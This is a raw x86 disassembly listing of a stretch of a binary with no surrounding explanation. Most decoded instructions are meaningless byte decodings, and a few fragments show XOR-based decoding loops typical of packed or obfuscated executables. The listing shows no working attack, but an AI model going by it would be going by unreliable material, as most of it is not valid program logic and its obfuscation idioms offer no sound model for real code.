  404953:	lds    esp,FWORD PTR [edi+0x1e]
  404956:	test   eax,0x4e6ae198
  40495b:	gs sbb cl,dl
  40495e:	mov    al,ds:0x6c50db3b
  404963:	sahf   
  404964:	cs pop ss
  404966:	inc    esp
  404967:	xchg   ecx,eax
  404968:	das    
  404969:	sbb    eax,0xdc923d7e
  40496e:	mov    bh,0xe2
  404970:	jle    0x4049bc
  404972:	mov    esp,0x43e31672
  404977:	mov    dh,BYTE PTR [ecx+0x1a]
  40497a:	mov    ss,WORD PTR [ecx*2+0x2c81f96b]
  404981:	xchg   BYTE PTR [esi],al
  404983:	cli    
  404984:	rcr    DWORD PTR [esi+edx*4-0x6f9f03b3],1
  40498b:	hlt    
  40498c:	or     al,0x7d
  40498e:	scas   al,BYTE PTR es:[edi]
  40498f:	std    
  404990:	jae    0x4049d0
  404992:	adc    esp,0xf
  404995:	adc    al,0x3d
  404997:	sub    edx,DWORD PTR [edi-0x4bc8ce72]
  40499d:	mov    fs,WORD PTR [ebx]
  40499f:	imul   DWORD PTR [ebp+0x8]
  4049a2:	cli    
  4049a3:	add    BYTE PTR [eax+0x7071fd98],0x30
  4049aa:	mov    bh,0x3a
  4049ac:	mov    cl,0x17
  4049ae:	inc    esi
  4049af:	inc    ebx
  4049b0:	jae    0x4049f2
  4049b2:	call   0xa773:0x250c23a6
  4049b9:	jne    0x404997
  4049bb:	jmp    0xe9db5acc
  4049c0:	std    
  4049c1:	clc    
  4049c2:	sbb    ebx,ecx
  4049c4:	(bad)  
  4049c5:	sti    
  4049c6:	mov    dh,0x70
  4049c8:	sub    eax,eax
  4049ca:	xchg   ebx,eax
  4049cb:	arpl   WORD PTR [edx-0x56f6ccdd],bp
  4049d1:	out    dx,eax
  4049d2:	adc    eax,DWORD PTR [esi]
  4049d4:	aad    0x3e
  4049d6:	cmp    al,dh
  4049d8:	popa   
  4049d9:	test   al,0xbd
  4049db:	aas    
  4049dc:	jne    0x404a4e
  4049de:	add    dl,BYTE PTR [edi-0x75]
  4049e1:	jge    0x4049eb
  4049e3:	sbb    DWORD PTR ds:0x43361b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4335b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433553
  404a04:	sbb    DWORD PTR ds:0x4335f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433623,0x4335f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433633,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx+0x2]
  404a70:	sahf   
  404a71:	idiv   BYTE PTR [edx+0x7c7c2d84]
  404a77:	stos   DWORD PTR es:[edi],eax
  404a78:	jg     0x404af6
  404a7a:	jl     0x404ab6
  404a7c:	in     eax,dx
  404a7d:	cs xor eax,0xa62a03ed
  404a83:	or     edx,0xffffffe9
  404a86:	popf   
  404a87:	push   ds
  404a88:	push   ss
  404a89:	(bad)  [edi]
  404a8b:	ins    BYTE PTR es:[edi],dx
  404a8c:	xchg   esp,eax
  404a8d:	sub    dl,ch
  404a8f:	dec    edx
  404a90:	mov    esi,0x7219d5d2
  404a95:	and    al,0x6d
  404a97:	and    eax,DWORD PTR [edx+0x57ce67c1]
  404a9d:	xchg   esp,eax
  404a9e:	jp     0x404ab1
  404aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aa1:	mov    esp,0x6f24b287
  404aa6:	sbb    esp,DWORD PTR [eax]
  404aa8:	stos   DWORD PTR es:[edi],eax
  404aa9:	add    al,bh
  404aab:	mov    esi,0x926610d7
  404ab0:	cld    
  404ab1:	cmp    al,0xcd
  404ab3:	xor    edx,DWORD PTR [ebx-0xc75b28a]
  404ab9:	and    al,0x88
  404abb:	sub    BYTE PTR [ecx],dl
  404abd:	imul   ebp,DWORD PTR [di-0x70ba],0xffffffe2
  404ac3:	push   0x23
  404ac5:	push   ss
  404ac6:	stc    
  404ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac8:	dec    ebx
  404ac9:	cmp    dl,BYTE PTR [ebx+0x1fe8a63f]
  404acf:	mov    eax,ds:0xed44b413
  404ad4:	leave  
  404ad5:	jp     0x404b36
  404ad7:	not    BYTE PTR [eax]
  404ad9:	xchg   BYTE PTR [edi+0x7],dl
  404adc:	mov    eax,ds:0x8ba132ec
  404ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ae2:	and    cl,BYTE PTR [edx+0x3fccf1ca]
  404ae8:	dec    ecx
  404ae9:	mov    eax,0x4de07db0
  404aee:	jl     0x404a90
  404af0:	dec    ecx
  404af1:	adc    bh,BYTE PTR ds:0xc018c024
  404af7:	pop    ebx
  404af8:	cmp    BYTE PTR ds:0x85764dc4,bh
  404afe:	adc    BYTE PTR [esi],dl
  404b00:	test   DWORD PTR [esi+0x1b],0xc3b9aa90
  404b07:	cmp    BYTE PTR [ebx],dh
  404b09:	sub    al,0xe7
  404b0b:	out    0x55,eax
  404b0d:	and    DWORD PTR [eax+ebp*4+0x4d916e70],0x1411e2de
  404b18:	test   ebx,ebp
  404b1a:	cwde   
  404b1b:	scas   al,BYTE PTR es:[edi]
  404b1c:	jl     0x404b22
  404b1e:	mov    esp,0xd9e08885
  404b23:	ds mov edx,0x31fa9699
  404b29:	pop    ecx
  404b2a:	(bad)  [edx-0x5f7bea52]
  404b30:	mov    esp,0x5bec489e
  404b35:	cdq    
  404b36:	dec    edi
  404b37:	cmp    eax,0x924f92c8
  404b3c:	adc    DWORD PTR [eax],ebp
  404b3e:	mov    ebx,0x65028cc2
  404b43:	sbb    al,0xa9
  404b45:	push   esp
  404b46:	dec    esi
  404b47:	cmc    
  404b48:	push   edx
  404b49:	sbb    DWORD PTR [eax+esi*2],edx
  404b4c:	xor    ch,BYTE PTR [ebp+0x10]
  404b4f:	fidiv  WORD PTR [ebx-0x61]
  404b52:	pop    edi
  404b53:	outs   dx,DWORD PTR ds:[esi]
  404b54:	mov    BYTE PTR [ebp+0x2a6c27c1],dl
  404b5a:	pop    ebp
  404b5b:	mov    cl,0x5a
  404b5d:	rcl    DWORD PTR [ebx],0x49
  404b60:	mov    al,0xa3
  404b62:	sub    dh,0xf
  404b65:	test   al,0x4a
  404b67:	push   ss
  404b68:	mov    bl,0x2e
  404b6a:	pop    esi
  404b6b:	ins    DWORD PTR es:[edi],dx
  404b6c:	out    0xbe,eax
  404b6e:	xchg   ebx,eax
  404b6f:	ins    BYTE PTR es:[edi],dx
  404b70:	add    ah,BYTE PTR [edx]
  404b72:	aas    
  404b73:	inc    edi
  404b74:	inc    esi
  404b75:	mov    eax,ds:0xfdf27e3c
  404b7a:	sbb    eax,ecx
  404b7c:	popa   
  404b7d:	add    esi,0xdeb0164f
  404b83:	pop    ds
  404b84:	fs sahf 
  404b86:	sub    eax,0x63d215da
  404b8b:	lds    edx,FWORD PTR [esi-0x6fa3b98d]
  404b91:	idiv   BYTE PTR [ebx+ecx*1-0x7a87b1b1]
  404b98:	std    
  404b99:	outs   dx,DWORD PTR ds:[esi]
  404b9a:	push   edi
  404b9b:	ins    BYTE PTR es:[edi],dx
  404b9c:	cdq    
  404b9d:	xchg   edx,eax
  404b9e:	test   al,0x4a
  404ba0:	mov    ebp,0xea157455
  404ba5:	inc    edi
  404ba6:	mov    ds:0xd2781b75,al
  404bab:	mov    ds:0x70205b6f,al
  404bb0:	inc    edi
  404bb1:	add    al,0x7c
  404bb3:	retf   
  404bb4:	push   esi
  404bb5:	out    0x71,eax
  404bb7:	dec    ebp
  404bb8:	aaa    
  404bb9:	rcr    BYTE PTR [esi+0x6dab521a],1
  404bbf:	fisub  WORD PTR [ecx]
  404bc1:	mov    ds:0xb321dd21,al
  404bc6:	mov    DWORD PTR [esi+0x31],ecx
  404bc9:	jb     0x404b85
  404bcb:	pop    DWORD PTR [ebp+0x3aafcda5]
  404bd1:	leave  
  404bd2:	or     al,0xad
  404bd4:	(bad)  
  404bd5:	into   
  404bd6:	outs   dx,BYTE PTR ds:[esi]
  404bd7:	pop    es
  404bd8:	out    dx,al
  404bd9:	or     ah,0x71
  404bdc:	data16 jmp 0x404c3b
  404bdf:	sub    dl,BYTE PTR [ebx-0x1227a71e]
  404be5:	pop    eax
  404be6:	xchg   esp,eax
  404be7:	fidivr DWORD PTR [eax-0x7f]
  404bea:	out    0xee,eax
  404bec:	dec    esi
  404bed:	push   esp
  404bee:	gs fwait
  404bf0:	(bad)
  404bf3:	or     edi,esi
  404bf5:	shr    ebp,0x5c
  404bf8:	inc    ebx
  404bf9:	(bad)  
  404bfa:	push   eax
  404bfb:	loopne 0x404bec
  404bfd:	xlat   BYTE PTR ds:[ebx]
  404bfe:	push   ebx
  404bff:	stos   BYTE PTR es:[edi],al
  404c00:	inc    edi
  404c01:	sti    
  404c02:	mov    ebx,0x3ac5b089
  404c07:	les    esi,FWORD PTR [edx]
  404c09:	je     0x404bd7
  404c0b:	ss inc edx
  404c0d:	xor    BYTE PTR [ebp-0x7d],bh
  404c10:	push   0x1bb74a6d
  404c15:	out    dx,eax
  404c16:	repz jmp 0x10f52695
  404c1c:	inc    BYTE PTR [edx+0x5ab391e7]
  404c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c23:	and    BYTE PTR [ebp+0x70d0d8ee],al
  404c29:	mov    ch,0x35
  404c2b:	out    0xfc,eax
  404c2d:	scas   al,BYTE PTR es:[edi]
  404c2e:	loope  0x404be5
  404c30:	xor    eax,ecx
  404c32:	add    eax,esi
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	jo     0x404c79
  404c5f:	jne    0x404bff
  404c61:	xor    ebp,DWORD PTR [edi]
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404bfd
  404c6a:	jl     0x404c13
  404c6c:	test   BYTE PTR [ebx],al
  404c6e:	xchg   esp,eax
  404c6f:	mov    al,ds:0x93b8af10
  404c74:	sub    cl,BYTE PTR fs:[ecx]
  404c77:	or     al,0x46
  404c79:	loope  0x404ce8
  404c7b:	jg     0x404cce
  404c7d:	adc    edx,DWORD PTR [edi]
  404c7f:	inc    eax
  404c80:	pushf  
  404c81:	cmp    ah,BYTE PTR [esi-0x6a131b54]
  404c87:	inc    ecx
  404c88:	adc    DWORD PTR ds:0x97aaa96f,0x1e7ad68
  404c92:	shr    ch,cl
  404c94:	div    bl
  404c96:	pop    ds
  404c97:	into   
  404c98:	pop    esp
  404c99:	jle    0x404cc8
  404c9b:	xor    bh,BYTE PTR [edi*4+0x51f64e9f]
  404ca2:	(bad)  
  404ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ca4:	adc    DWORD PTR [ebx+0xa],0xffffffe2
  404ca8:	out    0x4f,al
  404caa:	ja     0x404c65
  404cac:	jmp    0x404d2d
  404cae:	(bad)  
  404caf:	dec    esi
  404cb0:	push   esi
  404cb1:	or     BYTE PTR [ebx-0x36],bh
  404cb4:	pop    esp
  404cb5:	xlat   BYTE PTR ds:[ebx]
  404cb6:	in     eax,0xa3
  404cb8:	or     ecx,DWORD PTR [ebx-0x70db4e88]
  404cbe:	in     eax,dx
  404cbf:	mov    edi,DWORD PTR [ecx+0x25]
  404cc2:	psrld  mm5,QWORD PTR [ebx+edx*4+0x2f]
  404cc7:	out    dx,eax
  404cc8:	fs add dl,dh
  404ccb:	int3   
  404ccc:	dec    edi
  404ccd:	retf   0x3547
  404cd0:	or     ebp,ebp
  404cd2:	and    DWORD PTR [ecx+0x5a],ebx
  404cd5:	xchg   edx,eax
  404cd6:	aaa    
  404cd7:	repz pop edx
  404cd9:	sbb    DWORD PTR [edi-0x1a],edi
  404cdc:	fst    QWORD PTR ds:0x7bb1577d
  404ce2:	lods   al,BYTE PTR ds:[esi]
  404ce3:	cld    
  404ce4:	xchg   DWORD PTR [edi],edi
  404ce6:	jmp    0xf71e:0xa0479471
  404ced:	sbb    bh,ah
  404cef:	push   0xcbc7b2f8
  404cf4:	add    esp,DWORD PTR [ebp-0xe506b53]
  404cfa:	(bad)  
  404cfb:	xorps  xmm5,XMMWORD PTR [edx-0x77]
  404cff:	int    0x91
  404d01:	(bad)  
  404d02:	jbe    0x404d74
  404d04:	or     BYTE PTR [edi+esi*8-0x6d],cl
  404d08:	scas   eax,DWORD PTR es:[edi]
  404d09:	mov    BYTE PTR [edx+0x67f68fb4],ch
  404d0f:	add    cl,cl
  404d11:	fst    QWORD PTR [edi+0x46c1d99]
  404d17:	jmp    0x6f4e:0x647b3d57
  404d1e:	xchg   edx,eax
  404d1f:	jge    0x404d35
  404d21:	int    0x98
  404d23:	pop    ecx
  404d24:	fldcw  WORD PTR [edx+eiz*4]
  404d27:	and    edi,edi
  404d29:	push   esp
  404d2a:	jmp    0x5248:0x53fa070b
  404d31:	pop    ds
  404d32:	push   ss
  404d33:	dec    esp
  404d34:	repnz stc 
  404d36:	frstor [edx-0x38]
  404d39:	inc    edi
  404d3a:	pop    ds
  404d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d3c:	jae    0x404d05
  404d3e:	dec    ebp
  404d3f:	ins    BYTE PTR es:[edi],dx
  404d40:	mov    eax,0xf152bc37
  404d45:	dec    eax
  404d46:	aam    0x2d
  404d48:	ror    BYTE PTR [ebp-0x25],0x3d
  404d4c:	or     al,0xc5
  404d4e:	jmp    0xef9cb545
  404d53:	adc    al,0x2d
  404d55:	and    al,0x73
  404d57:	pop    esi
  404d58:	inc    ebp
  404d59:	push   0xffffffdf
  404d5b:	(bad)  
  404d5c:	scas   eax,DWORD PTR es:[edi]
  404d5d:	retf   
  404d5e:	leave  
  404d5f:	(bad)  
  404d60:	push   ebx
  404d61:	test   eax,0xf469f718
  404d66:	ds sbb al,0xb2
  404d69:	aaa    
  404d6a:	push   eax
  404d6b:	mov    esp,0xf7e110b3
  404d70:	dec    esp
  404d71:	(bad)  
  404d72:	sahf   
  404d73:	mov    al,0xd8
  404d75:	xchg   ebx,eax
  404d76:	push   esp
  404d77:	fidiv  WORD PTR [edx-0x32]
  404d7a:	nop
  404d7b:	lock out 0x9c,eax
  404d7e:	jno    0x404dae
  404d80:	or     ebx,DWORD PTR [ebp-0x31]
  404d83:	xor    eax,0xcf28805d
  404d88:	cld    
  404d89:	pop    ebp
  404d8a:	shl    ecx,0xb7
  404d8d:	inc    edi
  404d8e:	popf   
  404d8f:	cld    
  404d90:	fistp  WORD PTR [eax]
  404d92:	fdivr  QWORD PTR [ebp+esi*1-0x5dc80b69]
  404d99:	inc    esp
  404d9a:	ficomp WORD PTR [edi+0x0]
  404d9d:	mov    ds:0x2b76be97,eax
  404da2:	fnstsw WORD PTR [edi]
  404da4:	xor    al,BYTE PTR [eax]
  404da6:	xor    al,0x89
  404da8:	adc    DWORD PTR [esi-0x3c],ebp
  404dab:	outs   dx,BYTE PTR ds:[esi]
  404dac:	mov    eax,ds:0xd5fdf3cd
  404db1:	jo     0x404dd0
  404db3:	sub    BYTE PTR [eax-0x19],dh
  404db6:	xor    ecx,DWORD PTR [ecx+0x27e70c25]
  404dbc:	mov    edx,0x41283929
  404dc1:	xor    edx,edx
  404dc3:	sbb    DWORD PTR [eax],edx
  404dc5:	loope  0x404e21
  404dc7:	push   edi
  404dc8:	lds    ebp,FWORD PTR [edi+0x43]
  404dcb:	mov    al,BYTE PTR gs:[edx-0x7581c598]
  404dd2:	das    
  404dd3:	jae    0x404dab
  404dd5:	mov    dl,0x76
  404dd7:	mov    esi,0x60ac893b
  404ddc:	push   ebx
  404ddd:	xor    al,0x97
  404de0:	or     al,0xdb
  404de2:	aas    
  404de3:	push   ebx
  404de4:	adc    al,0x61
  404de6:	jno    0x404ddf
  404de8:	xchg   ebx,eax
  404de9:	jmp    0xa19ca4e4
  404dee:	push   esi
  404def:	stc    
  404df0:	arpl   dx,ax
  404df2:	int3   
  404df3:	add    eax,0x178619b5
  404df8:	cmp    eax,0x9cb6b3b3
  404dfd:	dec    ebp
  404dfe:	icebp  
  404dff:	repz scas eax,DWORD PTR es:[edi]
  404e01:	jl     0x404de8
  404e03:	shl    DWORD PTR [ecx-0x311d6dc7],0xba
  404e0a:	jge    0x404d8d
  404e0c:	out    0x4b,al
  404e0e:	push   ebp
  404e0f:	add    DWORD PTR [ebx-0x2d],eax
  404e12:	leave  
  404e13:	or     dl,BYTE PTR [ecx-0x63]
  404e16:	adc    cl,BYTE PTR es:[esi]
  404e19:	xchg   esi,eax
  404e1a:	xor    ebp,DWORD PTR [edx]
  404e1c:	mov    ebp,0x5448ac2
  404e21:	test   al,0x8b
  404e23:	push   ebp
  404e24:	or     al,0x3a
  404e26:	add    cl,BYTE PTR [edi]
  404e28:	test   ebp,esi
  404e2a:	add    eax,DWORD PTR [eax]
  404e2c:	add    BYTE PTR [ebx+0x558bf845],cl
  404e32:	or     al,0xf
  404e34:	mov    esi,0xe9c13312
  404e39:	int    0x1
  404e3b:	add    BYTE PTR [eax],al
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0xc7ae40eb
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404ea2
  404e56:	dec    esi
  404e57:	or     BYTE PTR [eax],0xba
  404e5a:	ss push cs
  404e5c:	fs leave 
  404e5e:	xor    bl,ah
  404e60:	cmp    ebx,esi
  404e62:	in     al,0x43
  404e64:	popa   
  404e65:	ins    DWORD PTR es:[edi],dx
  404e66:	loope  0x404e27
  404e68:	and    ecx,DWORD PTR [ebx+ebx*2+0x74]
  404e6c:	test   ecx,esp
  404e6e:	jle    0x404ed3
  404e70:	cmp    eax,0xb19b203d
  404e75:	pushf  
  404e76:	and    ah,BYTE PTR [eax]
  404e78:	and    DWORD PTR [ebp-0x728b2690],eax
  404e7e:	leave  
  404e7f:	or     eax,0x12137b96
  404e84:	stos   DWORD PTR es:[edi],eax
  404e85:	cmc    
  404e86:	call   0x20d6:0xc92514cd
  404e8d:	jo     0x404e23
  404e8f:	test   eax,0x1bcf61fe
  404e94:	mov    ebp,0x6d6f19b7
  404e99:	push   ebx
  404e9a:	in     al,0xfe
  404e9c:	or     al,0x5a
  404e9e:	jnp    0x404ef4
  404ea0:	mov    esp,0xd0b1be4
  404ea5:	stc    
  404ea6:	inc    edx
  404ea7:	push   ss
  404ea8:	add    BYTE PTR [ebx],dl
  404eaa:	add    DWORD PTR [edi],edi
  404eac:	jne    0x404ebf
  404eae:	or     DWORD PTR [esi],esi
  404eb0:	sbb    eax,0x6b728261
  404eb5:	ret    
  404eb6:	mov    ds:0xc5003f48,eax
  404ebb:	mov    eax,ds:0x95365f80
  404ec0:	sti    
  404ec1:	out    dx,al
  404ec2:	fld    QWORD PTR [edi]
  404ec4:	test   BYTE PTR [eax+0x356eb6a6],0x3a
  404ecb:	xor    al,0x41
  404ecd:	clc    
  404ece:	pop    ds
  404ecf:	jmp    0x3ab52dc
  404ed4:	inc    ebx
  404ed5:	sbb    ch,BYTE PTR [ebx+eax*4+0x7b]
  404ed9:	pop    edi
  404eda:	and    eax,0x6778d690
  404edf:	aas    
  404ee0:	sbb    ch,dh
  404ee2:	or     esi,DWORD PTR [ecx+0x49]
  404ee5:	or     DWORD PTR [ebp-0x4cecb581],0xedc5342
  404eef:	push   cs
  404ef0:	push   es
  404ef1:	adc    esp,eax
  404ef3:	mov    ebx,0xb5d8a3b3
  404ef8:	add    eax,0x54fe80dc
  404efd:	into   
  404efe:	cmc    
  404eff:	aad    0xa8
  404f01:	enter  0xae30,0xf3
  404f05:	xor    dh,BYTE PTR [esi-0x7bd29d8a]
  404f0b:	sbb    al,0x11
  404f0d:	gs xchg esi,eax
  404f0f:	mov    dh,0x52
  404f11:	(bad)  
  404f12:	(bad)
  404f15:	shl    DWORD PTR [ebx-0x40dbd32f],cl
  404f1b:	jbe    0x404f71
  404f1d:	sub    eax,0x44fa6569
  404f22:	(bad)  
  404f24:	jbe    0x404f0d
  404f26:	mov    dh,BYTE PTR [ecx+edi*1+0x77]
  404f2a:	cwde   
  404f2b:	add    eax,0x967836af
  404f30:	loope  0x404fa8
  404f32:	push   cs
  404f33:	popa   
  404f34:	ret    0x71b0
  404f37:	jbe    0x404f14
  404f39:	push   ebx
  404f3a:	push   0x9174aea8
  404f3f:	xchg   ecx,eax
  404f40:	cs mov ebp,0x6658ad99
  404f46:	xor    eax,esi
  404f48:	sub    al,0x3a
  404f4a:	dec    esi
  404f4b:	into   
  404f4c:	xchg   DWORD PTR [edx+0x30],ebp
  404f4f:	adc    ch,dh
  404f51:	inc    esi
  404f52:	and    edi,DWORD PTR ds:0x1fb1c63
  404f58:	adc    dl,bl
  404f5a:	out    dx,eax
  404f5b:	lods   eax,DWORD PTR ds:[esi]
  404f5c:	ret    
  404f5d:	mov    BYTE PTR ds:0xe6039e26,dl
  404f63:	push   ds
  404f64:	sbb    eax,DWORD PTR [eax+0x279bd1e9]
  404f6a:	cld    
  404f6b:	mov    ch,0xd5
  404f6d:	inc    esp
  404f6e:	test   DWORD PTR [ecx+0x67749563],ecx
  404f74:	mov    al,0x7d
  404f76:	mov    al,ds:0xfea4edd5
  404f7b:	out    dx,eax
  404f7c:	inc    edx
  404f7d:	fsub   DWORD PTR [edx]
  404f7f:	cmp    edi,DWORD PTR [edx-0x152d5ef1]
  404f85:	test   bh,ch
  404f87:	lds    ebx,FWORD PTR [ebx]
  404f89:	test   DWORD PTR [ebx-0x25],0xaf0c73fb
  404f90:	and    eax,0x6d65d29b
  404f95:	sub    eax,0xb1df7035
  404f9a:	lods   al,BYTE PTR ds:[esi]
  404f9b:	inc    esp
  404f9c:	rol    edi,1
  404f9e:	mov    eax,ds:0x69677945
  404fa3:	call   0x7232b75e
  404fa8:	mov    eax,ds:0xef24c362
  404fad:	add    eax,0xd5edf9bf
  404fb2:	enter  0x409b,0x9a
  404fb6:	inc    edi
  404fb7:	scas   al,BYTE PTR es:[edi]
  404fb8:	outs   dx,BYTE PTR ds:[esi]
  404fb9:	aaa    
  404fba:	daa    
  404fbb:	xor    BYTE PTR [esi-0x22],0x36
  404fbf:	lock and al,0x7e
  404fc2:	mov    al,ds:0xce00e352
  404fc7:	sub    BYTE PTR [ebp-0xe],cl
  404fca:	in     al,0xac
  404fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fcd:	(bad)  
  404fce:	sbb    al,0x15
  404fd0:	cmp    esi,DWORD PTR [ebx-0x42]
  404fd3:	and    dl,BYTE PTR [edi]
  404fd5:	jmp    DWORD PTR [ebp+0x1e]
  404fd8:	clc    
  404fd9:	xchg   esp,eax
  404fda:	and    bl,dh
  404fdc:	fsub   st(6),st
  404fde:	dec    ebp
  404fdf:	cmp    DWORD PTR [edx+0x20108ff2],ecx
  404fe5:	shl    ch,0x84
  404fe8:	or     al,BYTE PTR [edi-0x22]
  404feb:	and    DWORD PTR [ebx+edi*8+0x6180d413],ebx
  404ff2:	inc    edi
  404ff3:	stos   BYTE PTR es:[edi],al
  404ff4:	sub    eax,0xffffffbc
  404ff7:	aam    0xa3
  404ff9:	mov    dh,0x46
  404ffb:	dec    esp
  404ffc:	push   ebp
  404ffd:	or     eax,eax
  404fff:	int3   
  405000:	adc    BYTE PTR [ebx+0xa],cl
  405003:	dec    ecx
  405004:	mov    ds:0xcb003838,al
  405009:	loope  0x40500e
  40500b:	(bad)  
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	ret    
  405044:	cmovae esp,edx
  405047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405048:	sub    BYTE PTR [esp+edi*2-0x55],bh
  40504c:	jg     0x4050ca
  40504e:	jl     0x4050a9
  405050:	add    eax,0x23c8b957
  405055:	add    DWORD PTR [eax-0x1ee4be85],ebx
  40505b:	push   0x1f4c14f1
  405060:	hlt    
  405061:	xchg   edx,eax
  405062:	jecxz  0x4050ba
  405064:	pop    es
  405065:	fld    TBYTE PTR [eax-0x1c257e4f]
  40506b:	in     al,dx
  40506c:	(bad)  
  40506d:	and    edx,DWORD PTR [ecx]
  40506f:	cli    
  405070:	call   0xd336:0xfaca2cdd
  405077:	dec    eax
  405078:	out    dx,al
  405079:	add    cl,BYTE PTR [esi-0x5fccfdd5]
  40507f:	jmp    0x4050e1
  405081:	adc    dh,BYTE PTR [ebx+0x51573116]
  405087:	test   dh,0x4c
  40508a:	xchg   ecx,eax
  40508b:	mov    ah,BYTE PTR [eax-0x62]
  40508e:	fistp  QWORD PTR [ebp+0x43ab1c85]
  405094:	aaa    
  405095:	sti    
  405096:	outs   dx,BYTE PTR ds:[esi]
  405097:	inc    edx
  405098:	das    
  405099:	pop    edi
  40509a:	sub    ebp,DWORD PTR [edi+0x45d98f32]
  4050a0:	shr    BYTE PTR [ecx-0x60d49289],1
  4050a6:	scas   eax,DWORD PTR es:[edi]
  4050a7:	xchg   BYTE PTR [edi-0x5cb18f54],ch
  4050ad:	js     0x405065
  4050af:	shl    BYTE PTR [ebx+0x60cbe595],1
  4050b5:	dec    eax
  4050b6:	sbb    ah,bl
  4050b8:	lahf   
  4050b9:	(bad)  
  4050ba:	cmp    eax,0x694d0128
  4050bf:	or     BYTE PTR [ebx],0xd0
  4050c2:	xchg   ebp,eax
  4050c3:	lds    edi,FWORD PTR [ebp-0x6d]
  4050c6:	push   esp
  4050c7:	mov    esp,0x45dcebdd
  4050cc:	add    al,0xf
  4050ce:	inc    edi
  4050cf:	xchg   edi,eax
  4050d0:	sub    al,0xaf
  4050d2:	mov    cl,0x1c
  4050d4:	nop
  4050d5:	ret    0xb5c4
  4050d8:	jp     0x4050ea
  4050da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050db:	pop    edx
  4050dc:	call   0x331d437d
  4050e1:	or     ch,0x3b
  4050e4:	out    dx,eax
  4050e5:	out    dx,eax
  4050e6:	dec    eax
  4050e7:	xchg   BYTE PTR [ecx-0x1e94f4fb],dl
  4050ed:	adc    DWORD PTR [edi],esi
  4050ef:	mov    ecx,0x48075592
  4050f4:	or     al,0x3a
  4050f6:	rol    DWORD PTR [edi+ebp*4-0x4c22a724],0xbf
  4050fe:	and    eax,0x4eedb083
  405103:	ja     0x405178
  405105:	sahf   
  405106:	call   0x9869:0xbb2686dc
  40510d:	sbb    bh,cl
  40510f:	repnz stc 
  405111:	and    al,0x4a
  405113:	jns    0x405175
  405115:	or     ah,cl
  405117:	mov    ecx,0x2131573
  40511c:	push   es
  40511d:	sbb    al,0xa9
  40511f:	xor    al,0x2a
  405121:	lahf   
  405122:	test   eax,0x28aa96a5
  405127:	or     BYTE PTR fs:[esi],0x45
  40512b:	jle    0x4050d8
  40512d:	arpl   WORD PTR [edi],ax
  40512f:	and    eax,0xea0da2d6
  405134:	jno    0xa9cdeab
  40513a:	xchg   esp,eax
  40513b:	outs   dx,DWORD PTR ds:[esi]
  40513c:	test   DWORD PTR [edi],ecx
  40513e:	imul   ecx,esi,0x47
  405141:	inc    esi
  405142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405143:	jg     0x405160
  405145:	pop    esp
  405146:	inc    esp
  405147:	xor    dh,BYTE PTR [ebx]
